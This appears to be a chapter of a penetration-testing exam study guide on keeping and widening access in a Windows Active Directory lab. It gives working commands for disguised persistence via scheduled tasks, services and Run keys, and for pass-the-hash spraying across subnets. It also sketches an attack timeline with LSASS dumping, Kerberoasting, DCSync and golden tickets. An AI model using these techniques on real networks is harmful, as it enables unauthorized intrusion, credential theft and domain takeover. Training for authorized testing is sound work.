# Phase 14: Privilege Maintenance & Access Expansion

> Maintain and expand access. Never lose your foothold.

---

## Maintaining Access Across Reboots

```powershell
# Scheduled task (most reliable in exam)
schtasks /create /tn "WinUpdate" /tr "C:\Windows\Temp\beacon.exe" /sc ONSTART /ru SYSTEM /f

# Service-based persistence (survives reboots, runs as SYSTEM)
sc create WinSvc binpath= "C:\Windows\Temp\beacon.exe" start= auto
sc start WinSvc

# Registry autorun (user logon)
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v WinUpdate /t REG_SZ /d "C:\Windows\Temp\beacon.exe" /f
```

---

## Identifying Delegation & Inherited Rights

```powershell
# Find computers where you have inherited admin via group membership
# (BloodHound "AdminTo" edges from your owned groups)

# Find computers with delegated admin via OU/GPO:
Get-DomainGPOLocalGroup | Where-Object {$_.GroupMembers -match "your_group"}

# Find service accounts with domain admin equivalence:
Get-DomainUser -AdminCount | Select samaccountname, memberof
```

---

## Expanding Via Harvested Access

```bash
# Once you have multiple hashes/tickets — try them everywhere
nxc smb <subnet>/24 -u administrator -H <hash> --local-auth --continue-on-success
# Local admin hash reuse across workstations (same local admin password)

# Use DA creds to access all systems
nxc smb <subnet>/24 -u da_user -H <da_hash> --continue-on-success
nxc winrm <subnet>/24 -u da_user -H <da_hash>

# MSSQL with DA/sysadmin creds
nxc mssql <subnet>/24 -u sa -p Password1 --local-auth
# → xp_cmdshell on every SQL server
```

---

## Weak Architecture Patterns to Exploit

```powershell
# Find machines with delegated or inherited rights that you haven't pivoted to yet
Get-DomainComputer | Get-DomainObjectACL -ResolveGUIDs |
  ? {$_.IdentityReferenceName -match "your_group_or_user"}

# Find users with "Password Never Expires" (long-term persistence targets)
Get-DomainUser | ? {$_.PasswordNeverExpires -eq $true} | Select samaccountname

# Find disabled accounts with group memberships (sometimes re-enabled by mistake)
Get-DomainUser -LDAPFilter "(userAccountControl:1.2.840.113556.1.4.803:=2)" |
  ? {$_.MemberOf} | Select samaccountname, memberof
```

---

## Exam Final Checklist

Before ending the exam session, verify:

```
☐ Beacon running on every host you compromised
☐ DA / SYSTEM access confirmed and documented (screenshot)
☐ All flags collected from:
    - Foothold workstation Desktop
    - Intermediate pivot hosts Desktop
    - Domain Controller Desktop / C:\ root
    - SYSVOL / NETLOGON shares
    - Any database / application server in scope
☐ krbtgt hash dumped (proves full domain compromise)
☐ Screenshots of: whoami, hostname, ipconfig for each host
☐ Notes on attack path for report (if required)
```

---

## Exam Reference: Full Attack Chain

```
Day 1 — Exam

[00:00] C2 deployed (Sliver), beacon generated
[00:15] First beacon via evil-winrm with domain creds
[00:20] winPEAS + Seatbelt → SeImpersonatePrivilege found
[00:35] GodPotato → SYSTEM on WKSTN01
[00:45] LSASS dump → pypykatz → svc_sql:Passw0rd! + NTLM hashes
[01:00] SharpHound collection → BloodHound loaded
[01:10] BloodHound: svc_sql → Kerberoastable → path to DA via ACL chain
[01:20] Kerberoast svc_sql → hashcat → cracked in 2 min
[01:25] svc_sql → WriteDACL on Domain Admins → add youruser to DA
[01:35] DCSync as youruser → dump all hashes
[01:40] Beacon on DC via psexec as DA
[01:50] Collect flags: WKSTN01, SRV01, DC01
[02:00] Golden ticket forged (persistence)
[02:30] Second host pivot via LAPS / local admin hash reuse
[03:00] All flags collected — buffer time used for flag verification
[05:00] Exam complete ✅
```

This is a realistic timeline. Adapt based on what you actually find.
